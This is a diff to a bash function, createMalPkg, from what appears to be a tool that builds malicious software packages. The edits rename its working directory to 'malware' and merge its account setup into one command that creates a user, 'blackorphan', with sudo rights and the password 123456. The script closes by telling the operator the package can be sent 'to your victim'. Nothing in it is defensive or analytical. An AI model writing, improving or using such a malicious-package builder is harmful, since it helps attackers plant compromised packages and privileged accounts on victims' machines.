@@ -23,11 +23,11 @@ createMalPkg() {
 	case $inmissile in
 	    y|Y)
 		
-		dirfile="${0##*/}$SPID"
+		malwareDir="malware"
 		
-		mkdir "${dirfile}"
+		mkdir "${malwareDir}"
 		cd "$_"
-		chmod -R 777 "../${dirfile}"
+		chmod -R 777 "../${malwareDir}"
 		chk_file;
 		packagedetails
 		mkdir "${fileName}-${vnumber}"
@@ -40,15 +40,12 @@ createMalPkg() {
 		[[ "$(whoami)" == "root" ]] && \
 		    printf "\n\a${open}${bold}${red}[!]I cannot Package If you are root${close}\n" && \
 		    {
-			while printf "${open}${light}${green}%s\n: ${close}" "specify a user to package with"; read myUser junk
+			while printf "${open}${light}${green}%s: ${close}" "specify a user to package with"; read myUser junk
 			do
 
 			    [[ -z "${myUser}" ]] && myUser=blackorphan && \
 				printf "\n${open}${bold}${green}Creating user blackorpahn...${close}\n" && \
-				useradd "${myUser}" && \
-				usermod "${myUser}" -s /bin/bash --password 123456 && \
-				adduser "${myUser}" sudo && \
-				adduser "${myUser}" admin && \
+				useradd -G sudo -s /bin/bash --password 123456 "${myUser}"
 				
 				break
 			    if grep ^"$myUser" < /etc/passwd ;then
@@ -91,7 +88,7 @@ createMalPkg() {
 		    userdel "${myUser}"
 		
 		cp ./*.pkg.* "../"
-		rm -rf "../${dirfile}"
+		rm -rf "../${malwareDir}"
 		
 		printf "${open}${light}${green}Ok we are done here..${close}\n"
 		printf "${open}${light}${green}You can now send the package to your victim${close}\n"
